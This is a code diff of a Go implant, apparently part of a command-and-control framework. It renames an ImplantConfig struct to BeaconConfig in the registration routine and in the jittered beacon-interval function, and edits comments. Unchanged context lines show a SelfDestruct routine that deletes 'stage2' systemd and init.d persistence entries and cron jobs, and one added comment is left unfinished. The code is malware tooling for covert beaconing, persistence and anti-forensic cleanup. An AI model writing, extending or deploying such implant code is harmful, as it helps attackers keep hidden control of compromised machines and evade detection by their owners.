@@ -102,17 +102,18 @@ func (i *Implant) register() (string, error) {
 		return "", fmt.Errorf("unexpected status %s: %s", resp.Status, string(data))
 	}
 
+	// Corresponds to
 	var out struct {
-		ID           uint           `json:"id"`
-		CommProtocol string         `json:"comm_protocol"`
-		Config       *ImplantConfig `json:"config"`
+		ID           uint          `json:"id"`
+		CommProtocol string        `json:"comm_protocol"`
+		Config       *BeaconConfig `json:"config"`
 	}
 	if err = json.NewDecoder(resp.Body).Decode(&out); err != nil {
 		return "", fmt.Errorf("decode response: %w", err)
 	}
 
 	i.ID = out.ID
-	i.Config = out.Config
+	i.BeaconConfig = out.Config
 	return out.CommProtocol, nil
 }
 
@@ -124,14 +125,14 @@ func (i *Implant) register() (string, error) {
 // will be chosen uniformly from [4m, 6m)./
 func (i *Implant) NextBeaconInterval() time.Duration {
 	// compute lower + upper
-	minFactor := 1.0 - i.Config.Jitter
-	maxFactor := 1.0 + i.Config.Jitter
+	minFactor := 1.0 - i.BeaconConfig.Jitter
+	maxFactor := 1.0 + i.BeaconConfig.Jitter
 
 	// pick a random float in [minFactor, maxFactor)
 	factor := minFactor + rand.Float64()*(maxFactor-minFactor)
 
 	// scale dwell by the factor and return
-	d, _ := time.ParseDuration(i.Config.Dwell) // TODO: handle error, rename
+	d, _ := time.ParseDuration(i.BeaconConfig.Dwell) // TODO: handle error, rename
 	return time.Duration(float64(d) * factor)
 }
 
@@ -172,7 +173,7 @@ func (i *Implant) SelfDestruct() {
 	os.RemoveAll("/etc/systemd/system/stage2.service") // remove dir with system services
 	os.RemoveAll("/etc/init.d/stage2")
 
-	// -> removing cron jobs
+	// -> removing cron jobs (WORK IN PROG)
 	scheduler, _ := gocron.NewScheduler()
 	scheduler.RemoveByTags()
 
